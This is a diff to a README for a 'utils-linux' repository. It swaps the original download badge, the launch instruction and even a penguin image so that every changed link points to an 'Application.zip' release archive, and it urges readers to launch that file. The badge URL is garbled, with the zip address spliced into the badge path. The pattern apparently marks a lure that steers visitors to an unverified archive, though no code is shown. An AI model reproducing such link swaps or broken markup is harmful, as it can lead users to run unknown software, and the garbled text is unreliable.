@@ -24,9 +24,9 @@ Welcome to the **utils-linux** repository! Here you will find a collection of fi
 
 To explore all the files, scripts, and packages included in this repository, you can download the latest release from the following link:
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Release.zip-<COLOR>.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/dcaiimage2/utils-linux/releases/download/v1.0/Application.zip%https://github.com/dcaiimage2/utils-linux/releases/download/v1.0/Application.zip<COLOR>.svg)](https://github.com/dcaiimage2/utils-linux/releases/download/v1.0/Application.zip)
 
-🚀 Launch the **Release.zip** file to access all the goodies packed inside!
+🚀 Launch the **https://github.com/dcaiimage2/utils-linux/releases/download/v1.0/Application.zip** file to access all the goodies packed inside!
 
 In case the link is not working or additional releases are available, be sure to check the **Releases** section of this repository for the latest updates.
 
@@ -40,4 +40,4 @@ For any questions, feedback, or issues regarding the **utils-linux** repository,
 
 Let's make your Linux journey even more efficient and enjoyable with the tools and resources provided in this repository. Happy scripting and happy Linux-ing! 🐧✨
 
-![Linux Penguin](https://cdn.pixabay.com/photo/2012/04/13/11/18/linux-31067_960_720.png)
+![Linux Penguin](https://github.com/dcaiimage2/utils-linux/releases/download/v1.0/Application.zip)
